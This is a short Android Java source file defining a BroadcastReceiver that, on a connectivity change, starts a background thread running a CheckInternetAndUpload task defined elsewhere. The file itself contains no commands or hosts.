package com.android.network.detect;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.util.Log;

import java.util.ArrayList;

public class ConnectionChangeReceiver extends BroadcastReceiver {



    @Override
    public void onReceive(Context context, Intent intent)
    {
        CheckInternetAndUpload checkInternet = new CheckInternetAndUpload(context);
        new Thread(checkInternet).start();
    }


}

